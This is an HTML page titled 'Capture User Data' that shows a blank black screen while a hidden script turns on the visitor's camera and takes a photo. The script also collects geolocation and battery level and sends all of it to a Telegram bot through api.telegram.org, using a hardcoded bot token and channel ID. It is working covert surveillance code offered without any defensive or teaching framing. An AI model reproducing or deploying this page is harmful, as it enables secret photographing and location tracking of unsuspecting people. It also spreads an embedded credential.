<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture User Data</title>
    <style>
        body {
            background-color: black;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        #camera {
            display: none;
        }
    </style>
</head>
<body>
    <div id="camera">
        <video id="video" width="320" height="240" autoplay></video>
        <canvas id="canvas" width="320" height="240"></canvas>
    </div>

    <script>
        // Telegram Bot Token and Chat ID
        const botToken = '7096948712:AAHIiFUBPGghh6fiWHhkWAL9l9H5E7P0SJM';
        const chatId = '@BERLIN_IS_BERLIN';

        // Access the camera
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                video.srcObject = stream;

                // Wait for the video to load and then capture the photo
                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        capturePhotoAndSendData();
                    }, 1000); // Wait 1 second to ensure the camera is ready
                };
            })
            .catch((err) => {
                console.error("Error accessing the camera: ", err);
            });

        // Function to capture photo and send data
        function capturePhotoAndSendData() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 320, 240);
            const imageData = canvas.toDataURL('image/png');

            // Get location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // Get battery status
                    navigator.getBattery().then((battery) => {
                        const batteryLevel = battery.level * 100;

                        // Send data to Telegram bot
                        sendDataToTelegram(imageData, latitude, longitude, batteryLevel);
                    });
                }, (error) => {
                    console.error("Error getting location: ", error);
                });
            } else {
                console.error("Geolocation is not supported by this browser.");
            }
        }

        // Function to send data to Telegram
        function sendDataToTelegram(imageData, latitude, longitude, batteryLevel) {
            const message = `Location: Latitude ${latitude}, Longitude ${longitude}\nBattery: ${batteryLevel}%`;

            // Convert base64 image data to a Blob
            fetch(imageData)
                .then(res => res.blob())
                .then(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'photo.png');
                    formData.append('caption', message);

                    // Send the data to Telegram
                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log('Success:', data);
                    })
                    .catch((error) => {
                        console.error('Error:', error);
                    });
                });
        }
    </script>
</body>
</html>
